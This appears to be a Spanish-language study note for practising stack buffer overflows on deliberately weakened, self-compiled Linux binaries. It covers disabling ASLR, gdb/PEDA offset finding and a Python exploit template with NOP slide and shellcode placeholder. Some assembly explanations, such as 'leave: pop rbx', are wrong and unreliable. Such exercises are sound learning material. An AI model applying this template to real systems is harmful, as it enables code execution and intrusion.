#Distintos ejercicios para practicar 

<b>Desactivar ASLR:</b>

sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

<b>How to compile:</b> 
gcc prog.c -fno-stack-protector -z execstack

-fno-stack-protector: Deshabilita los stack Canaries

-z execstack: Permite ejecutar código en el stack, marcandolo como ejecutable

-g incluye la tabla de símbolos (útil para funciones de debug)

<b>Algunos recordatorios:</b>

El stack se gestiona con dos registros

rbp: register base pointer -> Se mantiene fijo al inicio del stack
rsp: register stack pointer -> Se actualiza al apilar y desapilar, crece hacia direcciones de memoria inferiores

Instrucciones: 

push: Apilar
pop: desapilar

leave: pop rbx
 
ret: pop rax
     jmp rax

-Al llamar a una función se setea el stack:

push rbp // Metemos la direccíón base del stack
mov rsp,rbp // En un inicio establecemos que rsp = rbp
sub rsp, 0x10 //Reservamos el espacio necesario en el stack

Funciones vulnerables:

1. gets
2. scanf
3. sprintf
4. strcpy
5. memcpy
6. getenv("var") //seteamos la variable con el shellcode

<b>Comados utiles</b>

1.Compilación
How to compile: gcc -fno-stack-protector -z execstack -g


2.Tomar el control del flujo de la aplicación

How to execute: gdb ./a.out
How to run in gdb: r <input>
	           //Setting buffer to argv1
	           r AAAAAAAAAAAAAAAAAAAA
	           r `python -c 'print "A"*72'+"B"*6`
	           r `cat exploit`
	           //Setting buffer to stdin
	           python -c 'print "A"* 44' > exploit
	           r < exploit

How to set breakpoints: b <line> or b <pointer> 
			b 8         b *main+23

Show stack size : p $rbp-$rsp (Mirarlo en el breakpoint)
Show stack content: x/100xb $rsp
Show stack frame info:info frame

GDB-PEDA: Cyclic pattern for Stack Overflow

pattern create 100
pattern arg 100 //set pattern to first argument
pattern offset //give the offset to overwrite RIP 
pattern search 0x4134414165414149


3.Saltando al rip guardado anteriormente 

get previus rip in gdb: info frame

import struct

padding = 'A'*offset
eip = struct.pack("I",<dir>) //For x32 address
      struct.pack("L",<dir>) //For x64 address
payload = "\xCC"*4 // Trap mode instruction, pone el procesador en modo trap 
		   // Ejecuta instrucciones una a una, lo ponemos para verificar que se ejecuta
		   // el salto correctamente
		 
print padding+eip+payload

4.Escribir el exploit (Una vez sepamos que el salto funciona)

import struct

padding = 'A'*offset
rip = struct.pack("L",<dir>) //For x64 address
nop_slide = '\x90' * 100 //No operation, no hace nada simplemente al caer aqui pasaria a ejecutar la siguiente instrucción
                         // Como las variables de entorno y los argumentos de la funcion tienen tamaño variable
			 // puede hacer que las direcciones del stack varie, por lo que como nunca tendremos la certeza
			 // exacta de donde vamos a caer establecemos los nop para tener mas margen de acierto más grande
shell = <shellcode> // shellcode que se ejecutara
			  
Ejecutar el exploit: (python expliot.py;cat ) | ./a.out 
                    // Se añade el cat debido a que sino al pasar la entrada con el pipe
                    // No tendriamos forma de interactuar con la shell
                    
</b>Posibles complicaciones<b>

Es posible que el exploit no te funcione porque las direcciones que muestra gdb sean distintas que las que tiene en un runtime
por lo cual sea necesario modificar la direccion de retorno. Existen scripts que con el ASLR desactivado consiguen hacer
que el stack en gdb sea el mismo que ejecutandolo normalmente

Try Harder!
